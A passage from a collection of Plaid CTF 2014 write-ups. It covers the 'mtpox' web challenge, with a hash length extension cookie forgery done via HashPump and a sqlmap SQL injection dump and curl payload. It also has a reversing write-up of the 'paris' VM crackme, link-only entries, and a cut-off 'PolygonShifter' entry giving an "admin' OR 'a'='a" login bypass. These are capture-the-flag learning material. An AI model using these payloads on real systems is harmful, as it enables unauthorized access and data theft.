The “Index” link on the website points to [`/index.php?page=index`](http://54.211.6.40/). Playing around with that URL query string parameter reveals that the site is vulnerable to source code disclosure. We exploit this vulnerability to get the source code for [`index.php`](index.php) (via [`/index.php?page=index.php`](http://54.211.6.40/index.php?page=index.php)) and [`admin.php`](admin.php) (via [`/index.php?page=admin.php`](http://54.211.6.40/index.php?page=admin.php)).

### Hash length extension vulnerability

Reading through the source code, we learn that [`admin.php`](admin.php) has some authentication logic:

```php
$auth = false;
if (isset($_COOKIE["auth"])) {
   $auth = unserialize($_COOKIE["auth"]);
   $hsh = $_COOKIE["hsh"];
   if ($hsh !== hash("sha256", $SECRET . strrev($_COOKIE["auth"]))) {
     $auth = false;
   }
}
else {
  $auth = false;
  $s = serialize($auth);
  setcookie("auth", $s);
  setcookie("hsh", hash("sha256", $SECRET . strrev($s)));
}
```

Let’s focus on the `else` clause for now, i.e. the code that is executed the first time you visit the site (without a cookie):

```php
$auth = false;
$s = serialize($auth);
setcookie("auth", $s);
setcookie("hsh", hash("sha256", $SECRET . strrev($s)));
```

So, the value of the `auth` cookie is `serialize(false)`, and the value of the `hsh` cookie acts as a signature for it. The cookie values for any logged out users are:

```
auth=b%3A0%3B
hsh=ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3
```

The value for `auth` makes sense, because in PHP, `false` serializes to `'b:0;`, and `true` serializes to `b:1;`:

```bash
$ php -r 'echo serialize(false);'
b:0;

$ php -r 'echo serialize(true);'
b:1;
```

We cannot simply change the value of the `auth` cookie from `b:0;` to `b:1;` to gain administrator rights, because the `hsh` cookie is used as a signature check. If the signature in `hsh` doesn’t match the `auth` value, we’re still not logged in.

After reading the source code more closely, we learn that the site is vulnerable to [hash length extension attacks](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks). Here’s the vulnerable code in [`admin.php`](admin.php):

```php
if ($hsh !== hash("sha256", $SECRET . strrev($_COOKIE["auth"]))) {
  $auth = false;
}
```

In general, an application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm, and entrusts the attacker with both the string and the hash, but not the secret. Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data.

Since `$_COOKIE["auth"]` and thus `strrev($_COOKIE["auth"])` are values under our control, we can use a hash length extension attack to append data to `strrev($_COOKIE["auth"])` so that `$SECRET . strrev($_COOKIE["auth"]))` generates a new hash that still matches the unknown prefix `$SECRET`. That hash can then be used as the value for the `hsh` cookie.

So, starting with the existing value for `strrev($_COOKIE["auth"])` (for which we know the signature hash), i.e. `;0:b`, what data should we append? We want to make it so that the value of the cookie is interpreted as `b:1;`, which reverses into `;1:b`.

Let’s use [HashPump](https://github.com/bwall/HashPump) to calculate the new signature. [The about page](http://54.211.6.40/index.php?page=about.php) reveals that `length($secret)` is `8`, but if we didn’t know that, we could still ‘bruteforce’ it by trying all key lengths from `1` to `32`.

```bash
$ hashpump --keylength 8 --signature 'ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3' --data ';0:b' --additional ';1:b'
967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1
;0:b\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`;1:b
```

Now we have a new signature hash (`967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1`) to be used as the value for the `hsh` cookie, and the new value on which the hash is based (i.e. `strrev($_COOKIE["auth"]`) along with the `$SECRET` prefix. In order to get the `auth` cookie value, we still need to reverse and URL-encode this result:

```bash
$ node
> var data = ';0:b\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`;1:b';
> console.log(encodeURIComponent(data.split('').reverse().join('')));
b%3A1%3B%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C2%80b%3A0%3B
```

Just to be sure, let’s verify that this value `unserialize`s to `true` instead of `false`:

```bash
$ php -r 'var_dump(unserialize(strrev(";0:b\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`;1:b")));'
bool(true)
```

Looking good. Now, let’s use these cookie values and reload `admin.php`:

```
auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b
hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1
```

And we’re successfully logged in!

### SQL injection vulnerability

The `query` URL parameter for [`/admin.php`](http://54.211.6.40/admin.php?query=lol) is vulnerable to SQL injection. Let’s see what kind of data we can leak using [`sqlmap`](http://sqlmap.org/):

```bash
$ sqlmap.py -u 'http://54.211.6.40/admin.php?query=abc' --cookie='auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b; hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1' --dump-all

    sqlmap/0.9 - automatic SQL injection and database takeover tool
    http://sqlmap.sourceforge.net

[*] starting at: 13:33:37

[13:33:37] [INFO] using '/usr/local/Cellar/sqlmap/0.9/output/54.211.6.40/session' as session file
[13:33:37] [INFO] testing connection to the target url
[13:33:37] [INFO] testing if the url is stable, wait a few seconds
[13:33:37] [INFO] url is stable
[13:33:37] [INFO] testing if GET parameter 'query' is dynamic
[13:33:37] [INFO] confirming that GET parameter 'query' is dynamic
[13:33:37] [INFO] GET parameter 'query' is dynamic
[13:33:37] [INFO] heuristic test shows that GET parameter 'query' might be injectable (possible DBMS: MySQL)
[13:33:37] [INFO] testing sql injection on GET parameter 'query'
[13:33:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:33:37] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
[13:33:37] [INFO] GET parameter 'query' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable
[13:33:37] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[13:33:37] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
[13:33:37] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[13:33:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
GET parameter 'query' is vulnerable. Do you want to keep testing the others? [y/N] y
sqlmap identified the following injection points with a total of 33 HTTP(s) requests:
---
Place: GET
Parameter: query
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: query=abc AND (SELECT 1000 FROM(SELECT COUNT(*),CONCAT(CHAR(58,98,119,100,58),(SELECT (CASE WHEN (1000=1000) THEN 1 ELSE 0 END)),CHAR(58,108,110,101,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
---

[13:33:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian or Ubuntu
web application technology: Apache 2.2.22, PHP 5.4.4
back-end DBMS: MySQL 5.0
[13:33:37] [INFO] sqlmap will dump entries of all databases' tables now
[13:33:37] [INFO] fetching tables
[13:33:37] [INFO] fetching database names
[13:33:37] [INFO] the SQL query used returns 2 entries
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: mtpox
[13:33:37] [INFO] the SQL query used returns 41 entries
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: CHARACTER_SETS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: COLLATIONS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: COLLATION_CHARACTER_SET_APPLICABILITY
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: COLUMNS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: COLUMN_PRIVILEGES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: ENGINES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: EVENTS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: FILES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: GLOBAL_STATUS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: GLOBAL_VARIABLES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: KEY_COLUMN_USAGE
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: PARAMETERS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: PARTITIONS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: PLUGINS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: PROCESSLIST
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: PROFILING
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: REFERENTIAL_CONSTRAINTS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: ROUTINES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: SCHEMATA
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: SCHEMA_PRIVILEGES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: SESSION_STATUS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: SESSION_VARIABLES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: STATISTICS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: TABLES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: TABLESPACES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: TABLE_CONSTRAINTS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: TABLE_PRIVILEGES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: TRIGGERS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: USER_PRIVILEGES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: VIEWS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_BUFFER_PAGE
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_TRX
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_BUFFER_POOL_STATS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_LOCK_WAITS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_CMPMEM
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_CMP
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_LOCKS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_CMPMEM_RESET
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_CMP_RESET
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_BUFFER_PAGE_LRU
[13:33:37] [INFO] retrieved: mtpox
[13:33:37] [INFO] retrieved: plaidcoin_wallets
[13:33:37] [INFO] fetching columns for table 'plaidcoin_wallets' on database 'mtpox'
[13:33:37] [INFO] the SQL query used returns 2 entries
[13:33:37] [INFO] retrieved: id
[13:33:37] [INFO] retrieved: varchar(40)
[13:33:37] [INFO] retrieved: amount
[13:33:37] [INFO] retrieved: int(30)
[13:33:37] [INFO] fetching entries for table 'plaidcoin_wallets' on database 'mtpox'
[13:33:37] [INFO] the SQL query used returns 1 entries
[13:33:37] [INFO] retrieved: 1333337
[13:33:37] [INFO] retrieved: flag{phpPhPphpPPPphpcoin}
Database: mtpox
Table: plaidcoin_wallets
[1 entry]
+---------+---------------------------+
| amount  | id                        |
+---------+---------------------------+
| 1333337 | flag{phpPhPphpPPPphpcoin} |
+---------+---------------------------+

[13:33:37] [INFO] Table 'mtpox.plaidcoin_wallets' dumped to CSV file '/usr/local/Cellar/sqlmap/0.9/output/54.211.6.40/dump/mtpox/plaidcoin_wallets.csv'
[13:33:37] [INFO] fetching columns for table 'CHARACTER_SETS' on database 'information_schema'
[13:33:37] [INFO] the SQL query used returns 4 entries
[13:33:37] [INFO] retrieved: CHARACTER_SET_NAME
…
```

The flag is `flag{phpPhPphpPPPphpcoin}`.

For the record, the payload `sqlmap` used to get the flag was:

```bash
$ curl --cookie 'auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b; hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1' 'http://54.211.6.40/admin.php?query=abc%20AND%20%28SELECT%203497%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%28CHAR%2858%2C103%2C99%2C121%2C58%29%2C%28SELECT%20MID%28%28IFNULL%28CAST%28id%20AS%20CHAR%29%2CCHAR%2832%29%29%29%2C1%2C50%29%20FROM%20mtpox.plaidcoin_wallets%20LIMIT%200%2C1%29%2CCHAR%2858%2C118%2C117%2C112%2C58%29%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29a%29'
Query failed: Duplicate entry ':gcy:flag{phpPhPphpPPPphpcoin}:vup:1' for key 'group_key'
```

## Other write-ups and resources

* <http://conceptofproof.wordpress.com/2014/04/13/plaidctf-2014-web-150-mtgox-writeup/>
* <https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack>
* <http://achatz.me/plaid-ctf-mt-pox/>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/mtpox)
* <https://github.com/hackerclub/writeups/blob/master/plaidctf-2014/mtpox/WRITEUP-arthurdent.md>
* [Indonese](http://blog.rentjong.net/2014/04/plaidctf2014-write-up-mtpox-web150.html)
* [Russian](http://blog.nostr.ru/2014/04/mtpox-web-150-pts-plague-has-traveled.html)
* <https://systemoverlord.com/blog/2014/04/14/plaidctf-mtpox/>
# Plaid CTF 2014: multiplication is hard

**Category:** Misc
**Points:** 10
**Description:**

> The Plague went back in time... but we haven't yet figured out what he did this time... Anyway, what is 38.55 * 1700?

## Write-up

Mathematically, `38.55 * 1700 = 65535` but that solution was not accepted.

Years ago (“back in time”), [Excel used to have a bug](http://blogs.office.com/2007/09/25/calculation-issue-update/) where calculations that resulted in a number close to 65,535 would instead show a result of 100,000.

The flag is `100000`.

## Other write-ups and resources

* <https://github.com/hackerclub/writeups/blob/master/plaidctf-2014/multiplication-is-hard/WRITEUP-pipecork.md>
* <http://csrc.tamuc.edu/css/?p=152>
# Plaid CTF 2014: __nightmares__

**Category:** Pwnables
**Points:** 375
**Description:**

> The Plague is building an army of evil hackers, and they are starting off by teaching them python with this simple service. Maybe if you could get full access to [this system](__nightmares__-0873934805b8f0c0c38eeae6db5fc1e8.tar.bz2), at 54.196.37.47:9990, you would be able to find out more about The Plague's evil plans.

## Write-up

(TODO)

## Other write-ups and resources

* [Write-up by Martin Heistermann](http://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/)
* [Write-up by More Smoked Leet Chicken](http://mslc.ctf.su/wp/plaidctf-2014-__nightmares__-writeup/)
* [Write-up by fail0verflow](https://fail0verflow.com/blog/2014/plaidctf2014-pwn375-__nightmares__.html)
* [Solution by the Pwnies team](https://gist.github.com/IdolfHatler/8ba6f93472b3834d00c7)
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/pwnables/__nightmares__)
* <http://rootfoo.org/ctf/2014-plaid-nightmares-375>
* [Chinese](http://atdog.logdown.com/posts/2014/04/16/plaidctf-write-up-pwn375)
# Plaid CTF 2014: paris

**Category:** Reversing
**Points:** 300
**Description:**

> [This binary](paris-20b542bf824d8d0daf240bbf3febbce0.tar.bz2) was found on some of our Windows machines. It's got The Plague written all over it. What secrets are contained inside?

## Write-up

The binary is a password crackme. It uses a VM with 20 different opcodes for obfuscating the password checking algorithm. The VM does some peculiar things however.

We need to find a password such that ESI has the value `0xdeadbeef` after `process_password` gets called:

```nasm
.text:00401056 call    process_password
.text:0040105B push    0FFFFFFF5h                      ; nStdHandle
.text:0040105D call    ds:GetStdHandle
.text:00401063 push    0
.text:00401065 push    offset NumberOfCharsWritten
.text:0040106A cmp     esi, 0DEADBEEFh
.text:00401070 jnz     try_again
```

Looking at `process_password` each attempt to decode a VM instruction also generates an exception:

```nasm
.text:00402066 process_password proc near
.text:00402066 xor     ecx, ecx
.text:00402068
.text:00402068 loop_vm:
.text:00402068 push    offset seh_handler
.text:0040206D push    large dword ptr fs:0
.text:00402074 mov     large fs:0, esp
.text:0040207B mov     eax, 0
.text:00402080 mov     [eax], eax                      ; jump to seh_handler
.text:00402082 sub     edi, 1111h                      ; also important
.text:00402088 pop     large dword ptr fs:0
.text:0040208F add     esp, 4
.text:00402092 cmp     vm_done_flag, 1
.text:00402099 jz      vm_done
.text:0040209F jmp     short loop_vm
.text:0040209F process_password endp
```

It seems the SEH handler is actually responsible for decoding the instructions. Also, note the `sub edi, 1111h` which will be important later.

Looking at the SEH handler:

```nasm
.text:00402376 seh_handler:
.text:00402376 movzx   eax, byte ptr vm_current_opcode_dispatch
.text:0040237D add     eax, offset vm_opcode_dispatch
.text:00402382 mov     eax, [eax]
.text:00402384 add     byte ptr vm_current_opcode_dispatch, 4
.text:0040238B cmp     byte ptr vm_current_opcode_dispatch, 50h
.text:00402392 jl      short loc_40239B
.text:00402394 mov     byte ptr vm_current_opcode_dispatch, 0
.text:0040239B
.text:0040239B loc_40239B:
.text:0040239B jmp     eax
```

It doesn’t seem to do anything too special. It just loops through an array of functions for each exception that gets generated.

Looking at the function array:

```nasm
.text:0040220E vm_opcode_dispatch dd offset vm_0_nop
.text:00402212 dd offset vm_201_mov_r_r
.text:00402216 dd offset vm_202_mov_r_r
.text:0040221A dd offset vm_203_mov_r_mem_r_
.text:0040221E dd offset vm_13_mov_r_imm16
.text:00402222 dd offset vm_98_add_r_r
.text:00402226 dd offset vm_99_sub_r_r
.text:0040222A dd offset vm_9a_xor_r_r
.text:0040222E dd offset vm_9b_and_r_r
.text:00402232 dd offset vm_9_shr_r_8
.text:00402236 dd offset vm_15_not_r
.text:0040223A dd offset vm_2_inc_r
.text:0040223E dd offset vm_3f_cmp_r_r
.text:00402242 dd offset vm_1f_jmp_imm
.text:00402246 dd offset vm_1d_jz_imm
.text:0040224A dd offset vm_7_push_r
.text:0040224E dd offset vm_18_pop_r
.text:00402252 dd offset vm_1b_bswap_r
.text:00402256 dd offset vm_0a_xor_decrypt      ;; "unorthodox" instruction (XORs 200h bytes)
.text:0040225A dd offset vm_14_done
```

Looking at some of the handlers, some patterns emerge. There are three helper functions used in the instruction handlers:

1. `00401CF0 vm_1byte_instruction_ebx`
2. `00401D19 vm_2byte_instruction_ebx_ecx`
3. `00401D50 vm_3byte_instruction_ebx_ecx`

Each of these functions reads in the next bytes in the code stream and returns the decode opcode in `eax` and operands in `ebx` and `ecx`.

Another peculiar thing is that each instruction handler will subtract a value (the opcode) from `eax` and `setz al` before jumping to this code:

```nasm
.text:00401FCA mov     edx, [esp+arg_8]
.text:00401FCE cmp     al, 1
.text:00401FD0 jz      inc_eh_ret_by_2
.text:00401FD6 mov     esi, offset vm_copy_of_host_cpu_registers
.text:00401FDB mov     edi, edx
.text:00401FDD mov     ecx, 34h
.text:00401FE2 rep movsd
.text:00401FE4 mov     esi, offset vm_copy_of_password_buff
.text:00401FE9 mov     edi, offset password_buff       ; "V1rTu4L_M"
.text:00401FEE mov     ecx, 100h
.text:00401FF3 rep movsd
.text:00401FF5 mov     esi, 401890h
.text:00401FFA mov     edi, offset vm_unknown_input
.text:00401FFF mov     ecx, 80h
.text:00402004 rep movsd
.text:00402006 mov     al, byte_4024AB
.text:0040200B mov     vm_zf, al
.text:00402010 mov     al, initial_vm_done_flag
.text:00402015 mov     vm_done_flag, al
.text:0040201A mov     ax, vm_ip_copy
.text:00402020 mov     vm_ip, ax
.text:00402026 mov     ax, vm_sp_copy
.text:0040202C mov     vm_sp, ax
.text:00402032 jmp     inc_eh_ret_by_2
```

That checks if `al` is `1` (i.e. if `setz al` set it to `1`). If `al` was not set to `1`, it reverts the VM to the state before executing that instruction. This is probably the weirdest thing about this VM, it checks and runs the VM code and reverts if it later figures out that it wasn’t the proper opcode for the instruction it just executed.

The VM registers seem to be kept at `[esp+0Ch]+9ch`. This is all running inside a SEH handler and `[esp+0Ch]` points to the CONTEXT struct which contains (among other things) the register state when the exception occured. At offset `9ch` in the CONTEXT struct you have the EDI register. Based on the instruction handlers and the 3 helper functions the VM seems to be all 16-bit and has 3 bits for register encoding in the instructions (that means 8 general purpose registers in total). So `r0`-`r7` (VM registers) seem to be overlayed on top of EDI, ESI, EBX, EDX. Now, remember the `sub edi, 1111h` happening for each instruction decoded? That’s going to change `r0` and `r1` inside the VM (ouch) each time an attempt to decode an opcode is made.

Note: This is the long way (my way) of doing this, you can probably put a conditional breakpoint right after the call to one of the three helper functions and check if `eax` has the proper opcode value and trace.

I wrote [a simple script](disasm.py) to disassemble all the VM code and then formatted it to something more pleasant (I tend to like static analysis better). This resulted in:

```nasm
[0000] nop
[0001] nop
[0002] nop
[0003] mov r2, 0x3133
[0006] mov r3, 0x0
[0009] mov r4, 0xff00
[000c] mov r5, 0xff
loop_mem:
  [000f] mov r0, word [r3]    ;; actually r0 = [r3] - 3332h, because of sub edi, 1111h and the loopy behavior
  [0011] mov r7, r0
  [0013] bswap r7
  [0014] not r7
  [0015] cmp r7, r2
  [0017] jz loop_mem_exit
  [001a] mov r6, r7
  [001c] and r6, r4
  ;; r7 = word[r3] & 0xff
  [001e] and r7, r5
  ;; r6 = word[r3] & 0xff00 >> 8
  [0020] shr r6, 8
  [0021] xor r7, r6
  ;; r6 = 0x200
  [0023] mov r6, 0x200
  [0026] add r7, r7
  [0028] add r6, r7
  [002a] mov r7, word [r6]
  [002c] bswap r7
  [002d] pop r6
  [002e] xor r7, r6
  [0030] push r6
  [0031] push r7
  [0032] xor200h r3
  [0033] inc r3
[0034] jmp loop_mem
loop_mem_exit:
;; r7 = 0
;; r2 = 0x100
;; r6 = 0xaf21
[0037] xor r7, r7
[0039] mov r2, 0x100
[003c] mov r6, 0xaf21
loop_stack:
  [003f] mov r5, word [r2]
  [0041] bswap r5
  [0042] inc r2
  [0043] inc r2
  [0044] pop r3    ;; need to pop 0x5a4d here before r5 == 0xaf21, stack also needs to be aligned after that pop
  [0045] cmp r5, r6
  [0047] jz good_boy
  [004a] cmp r5, r3
  [004c] jz loop_stack
[004f] mov r3, 0x0
[0052] mov r2, 0x0
[0055] done
good_boy:
[0056] mov r5, 0x5a4d
[0059] cmp r3, r5    ;; r3 needs to be 0x5a4d
[005b] jz good_boy_final
[005e] mov r3, 0x0
[0061] mov r2, 0x0
[0064] done
good_boy_final:
[0065] mov r3, 0xdead   ;; r2 and r3 overlay on top of ESI which we want to be set to 0xdeadbeef
[0068] mov r2, 0xbeef
```

The base of memory seems to be where the password read from the keyboard is stored (`00401490`). What the VM code appears to be doing is pushing some values to the stack in the first loop and in the second loop it compares the stack with the values at `MEM_100h`. Also note the use of `r0` which gets changed in each attempt to decode an instruction.

And this (in reverse) is what the stack should look like:

```nasm
.text:00401590 dw 2E0Bh
.text:00401592 dw 6D02h
.text:00401594 dw 7492h
.text:00401596 dw 870Ch
.text:00401598 dw 93B9h
.text:0040159A dw 0EDB3h
.text:0040159C dw 312Ch
.text:0040159E dw 7107h
.text:004015A0 dw 7D10h
.text:004015A2 dw 2007h
.text:004015A4 dw 0E7C6h
.text:004015A6 dw 3A1Bh
.text:004015A8 dw 0BAD8h
.text:004015AA dw 9417h
.text:004015AC dw 0FA6Bh
.text:004015AE dw 0BE6Ch
.text:004015B0 dw 621Dh
.text:004015B2 dw 4D3Bh
.text:004015B4 dw 47ADh
.text:004015B6 dw 7A7Ah
.text:004015B8 dw 3E9Dh
.text:004015BA dw 53A2h
.text:004015BC dw 0F22Fh
.text:004015BE dw 0D1A9h
.text:004015C0 dw 0F574h
.text:004015C2 dw 8173h
.text:004015C4 dw 11BCh
.text:004015C6 dw 0AE15h
.text:004015C8 dw 6179h
.text:004015CA dw 0AF21h    ;; this actually needs to be 0x5a4d which is already the top of the stack
```

So we need to find a password for which each adjacent two characters with the `sub` and `xor` will point to an index in `MEM_200h` where a uint16 is found that when XORed with the top of the stack should yield the next value from the array at `MEM_100h`. *gasp*

Note: There may be a nicer way of doing this next thing (compared to what I did) but it took me a while to figure out the importance of `sub edi, 1111h` and I was a bit paranoid that subtracting `3332h` would make the guessing more complicated due to carry between high and low bytes. I imagine you can roll `MEM_200h` to the last iteration and check the last value and unroll `MEM_200h` and check the second value and maybe that would be easier.

So, what I did was bruteforce all possible candidate pairs of “printable” characters for each word that needs to be on the stack and then combine them in sequence to get the flag. My script is named [`messy.py`](messy.py). Run it as follows:

```bash
$ python messy.py
```

Among the things my messy script produced was:

```nasm
('V', ('1', ('r', ('T', ('u', ('4', ('L', ('_', ('M', ('4', ('c', ('h', ('1', ('n', ('3', ('s', ('_', ('4', ('r', ('3',
('_', ('A', ('w', ('3', ('s', ('0', ('m', ('3', None))))))))))))))))))))))))))))
```

Well, it was missing the last `!` character, but meh. The flag was `V1rTu4L\_M4ch1n3s\_4r3\_Aw3s0m3!`.

## Other write-ups and resources

* <http://idabook.com/paris_writeup.txt> by Chris Eagle
* <https://fail0verflow.com/blog/2014/plaidctf2014-re300-paris.html>
* <http://piggybird.net/2014/04/plaidctf-2014-reversing-300-paris/>
# Plaid CTF 2014: parlor

**Category:** Crypto
**Points:** 250
**Description:**

> The Plague is running a betting service to build up funds for his massive empire. Can you figure out a way to beat the house?
>
> The service is running at 54.197.195.247:4321.

## Write-up

```bash
$ nc 54.197.195.247 4321
/------------------------------------------------------------------------------\
| Welcome to the betting parlor!                                               |
|                                                                              |
| We implement State of the Art cryptography to give you the fairest and most  |
| exciting betting experience!                                                 |
|                                                                              |
| Here's how it works: we both pick a nonce, you tell us odds, and you give us |
| some money.                                                                  |
| If md5(our number + your number) % odds == 0, you win bet amount*odds.       |
| UPDATE: IF YOU DIDN'T REALIZE IT, WE DO INCLUDE A NEWLINE AT THE END OF YOUR |
| NUMBER. SORRY FOR THE INCONVENIENCE. THANK YOU FOR USING PARLOR              |
| Otherwise, we get your money! We're even so nice, we gave you $1000 to start.|
|                                                                              |
| If you don't trust us, we will generate a new nonce, and reveal the old nonce|
| to you, so you can verify all of our results!                                |
|                                                                              |
| (Oh, and if you win a billion dollars, we'll give you a flag.)               |
\______________________________________________________________________________/

====================
  1) set your odds
  2) set your bet
  3) play a round
  4) get balance
  5) reveal nonce
  6) quit
====================
```

(TODO)

## Other write-ups and resources

* <http://blog.mheistermann.de/2014/04/14/plaidctf-2014-parlor-crypto-250-writeup/>
* <http://mslc.ctf.su/wp/plaidctf-2014-parlor-writeup/>
* <https://fail0verflow.com/blog/2014/plaidctf2014-crypto250-parlor.html>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/crypto/parlor)
* <http://blog.ztrix.me/blog/2014/04/14/plaidctf-2014-parlor-writeup/>
# Plaid CTF 2014: PolygonShifter

**Category:** Web
**Points:** 100
**Description:**

> The Plague has purchased the newest invention, _Polygon Shifter_ to protect his website. This cutting edge technology is made available by Polygon Security, and they have a demo page on their [website](http://54.204.80.192/). They claim bots can no longer attack the website protected by the Polygon Shifter. Do we need to manually bruteforce the credentials?

## Write-up

Looking into the source code, we learn that there is a ‘secret’ admin account:

```html
<div class="row">
<div class="medium-10 small-centered columns">
    <h3>To demonstrate our technology, we have a form that is protected with our solution. Humans shall pass, but bots will FAIL.</h3>
    <h3>Test account is test / test</h3>
    <!--<h3>For admin interface, admin / ???????</h3>-->
</div>
</div>
```

Let’s try to log in to this admin account. We don’t have the credentials, so we’ll try SQL injection instead:

* Username: `admin' OR 'a'='a`
* Password: `random`

Great, we’re logged in! We are welcomed with the following message:

> Hello, admin!! My password is the flag!

It seems like we need to find the password using SQL injection. Let’s peek into the source code some more:

```html
<h4 class="product-header">A friendly login form; not so friendly for bots!</h4>
<div class="medium-11 small-centered columns">
    <form action="/P0zxeNVpdjH6myRHaWVS" method="POST">
        <label for="" style="text-align:left;">Username</label>
